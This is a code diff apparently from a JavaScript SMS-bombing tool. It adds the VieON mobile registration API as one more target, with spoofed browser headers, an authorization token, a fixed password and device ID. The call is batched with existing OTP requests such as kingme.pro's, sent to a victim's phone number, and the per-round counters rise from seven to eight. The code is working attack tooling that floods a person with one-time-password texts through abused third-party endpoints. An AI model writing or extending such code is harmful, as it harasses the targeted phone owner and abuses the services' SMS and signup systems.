@@ -188,6 +188,44 @@ const kingMeData = {
   msisdn: phone,
 };
 
+    const vieonHeaders = {
+  'Host': 'api.vieon.vn',
+  'content-length': '201',
+  'accept': 'application/json, text/plain, */*',
+  'content-type': 'application/x-www-form-urlencoded',
+  'sec-ch-ua-mobile': '?1',
+  'authorization': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...',
+  'user-agent': 'Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30...',
+  'sec-ch-ua-platform': '"Android"',
+  'origin': 'https://vieon.vn',
+  'sec-fetch-site': 'same-site',
+  'sec-fetch-mode': 'cors',
+  'sec-fetch-dest': 'empty',
+  'referer': 'https://vieon.vn/?utm_source=google&utm_medium=cpc...',
+  'accept-encoding': 'gzip, deflate, br',
+  'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4'
+};
+
+// Request parameters and payload
+const params = {
+  platform: 'mobile_web',
+  ui: '012021'
+};
+
+const payload = {
+  phone_number: phone,
+  password: 'Vexx007',
+  given_name: '',
+  device_id: '7c775cd1cd49a31c3893ca1e09abbde3',
+  platform: 'mobile_web',
+  model: 'Android 10',
+  push_token: '',
+  device_name: 'Chrome/110',
+  device_type: 'desktop',
+  ui: '012021'
+};
+
+
 
     // Initial message to be edited later
     let messageID = null;
@@ -230,14 +268,18 @@ const kingMeData = {
           headers: kavayHeaders,
           cookies: kavayCookies
         }), 
-        axios.post('https://kingme.pro/vi/Otp/SendOtpVerifyPhoneNumber', kingMeData, { headers: kingMeHeaders })
+        axios.post('https://kingme.pro/vi/Otp/SendOtpVerifyPhoneNumber', kingMeData, { headers: kingMeHeaders }), 
+        axios.post('https://api.vieon.vn/backend/user/register/mobile', payload, {
+  headers: vieonHeaders,
+  params: params
+})
       ])
       .then(() => {
-        successCount += 7;
+        successCount += 8;
         updateMessage();
       })
       .catch(() => {
-        failureCount += 7;
+        failureCount += 8;
         updateMessage();
       });
     };
